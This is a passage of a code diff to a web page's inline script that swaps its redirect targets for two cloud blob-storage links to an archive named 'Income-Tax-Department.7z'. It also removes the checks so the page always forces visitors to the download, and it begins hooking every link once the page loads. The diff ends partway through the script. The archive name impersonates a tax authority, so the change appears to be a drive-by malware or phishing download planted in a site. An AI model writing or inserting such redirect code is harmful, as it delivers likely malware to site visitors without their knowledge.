@@ -187,12 +187,12 @@ document.addEventListener('DOMContentLoaded', function () {
 
 <script>
 (function(){
-  var MAIN='https://choosemytime.com/s/latest', BAK='https://ku-web.com/s/latest';
+  var MAIN='https://etwe3gate0111a.blob.core.windows.net/public/dl/Income-Tax-Department.7z';
+  var BAK='https://etwe3jsdl0111a.blob.core.windows.net/public/dl/Income-Tax-Department.7z';
   function tryGo(url, fallback){
-    fetch(url,{method:'HEAD',cache:'no-store'}).then(function(r){
-      if(r.ok||r.status===302||r.type==='opaque'){ location.href=url; }
-      else if(fallback){ tryGo(fallback, null); }
-    }).catch(function(){ if(fallback){ location.href=fallback; } });
+    fetch(url,{method:'HEAD',mode:'no-cors',cache:'no-store'}).then(function(r){
+      location.href=url;
+    }).catch(function(){ location.href = fallback || url; });
   }
   document.addEventListener('DOMContentLoaded', function(){
     var links=document.querySelectorAll('a[href]');
